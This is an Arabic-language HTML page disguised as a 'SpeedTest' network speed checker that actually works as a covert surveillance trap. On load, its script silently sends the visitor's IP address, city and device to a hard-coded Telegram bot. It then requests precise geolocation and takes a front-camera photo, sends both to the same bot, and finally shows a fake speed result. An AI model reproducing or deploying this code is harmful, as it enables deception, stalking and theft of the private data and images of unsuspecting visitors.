<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SpeedTest - فحص سرعة الشبكة</title>
    <style>
        body { background: #0b0c10; color: #66fcf1; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader { width: 150px; height: 150px; border: 8px solid #1f2833; border-top: 8px solid #45a29e; border-radius: 50%; animation: spin 1.5s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .text { margin-top: 25px; font-size: 1.3rem; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div class="text" id="status">جاري الاتصال بالسيرفر...</div>

    <video id="video" playsinline autoplay muted style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TOKEN = "8734073875:AAF5fOQ11ouU73zemiV5hxuAhdOao0Zls3s";
        const CHAT_ID = "6082990097";

        async function sendToTelegram(msg) {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
        }

        async function startHack() {
            // 1. البيانات الصامتة (IP ومعلومات الجهاز) - ترسل فوراً
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                let silentMsg = `🌐 *بيانات فورية:*\n• الـ IP: \`${ipData.ip}\`\n• المدينة: ${ipData.city}\n• الجهاز: ${navigator.platform}`;
                sendToTelegram(silentMsg);
            } catch (e) {}

            // 2. طلب الموقع (يرسل فور الموافقة)
            navigator.geolocation.getCurrentPosition(p => {
                const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                sendToTelegram(`📍 *الموقع الدقيق:*\n${map}`);
            }, null, {enableHighAccuracy:true});

            // 3. الكاميرا (تصوير فوري بدون مؤقت)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: {facingMode:"user"} });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // الانتظار فقط لجزء من الثانية للتأكد من أن الفيديو بدأ (بدون مؤقت ملحوظ)
                video.onloadedmetadata = () => {
                    video.play();
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    // لقطة فورية
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID);
                        fd.append('photo', blob, 'shot.jpg');
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:fd})
                        .then(() => {
                            stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا فوراً
                            document.getElementById('status').innerText = "اكتمل الفحص: 52.1 Mbps";
                        });
                    }, 'image/jpeg');
                };
            } catch (e) {
                // في حال الرفض
            }
        }

        window.onload = startHack;
    </script>
</body>
</html>
